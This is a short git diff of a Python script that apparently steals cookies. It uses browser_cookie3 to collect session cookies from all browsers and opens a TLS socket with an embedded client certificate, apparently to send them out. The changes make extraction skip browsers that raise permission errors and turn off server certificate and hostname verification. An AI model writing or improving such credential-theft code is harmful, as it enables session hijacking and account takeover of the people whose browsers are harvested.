@@ -1,9 +1,9 @@
+import pprint
 import socket
 import ssl
 import tempfile
 import threading
 import time
-
 import browser_cookie3
 import certs
 from colorama import Fore
@@ -111,6 +111,8 @@ def startExtraction():
 
         except browser_cookie3.BrowserCookieError:
             continue
+        except PermissionError as e:
+            continue
 
 
     return allCookiesFromBrowsers, allValiousCookiesFromBrowsers
@@ -188,7 +190,8 @@ if __name__ == "__main__":
     csd.close()
 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-    # context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
+    context.verify_mode = ssl.CERT_NONE
+    context.check_hostname = False
     context.load_cert_chain(certfile=cock.name, keyfile=csd.name)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
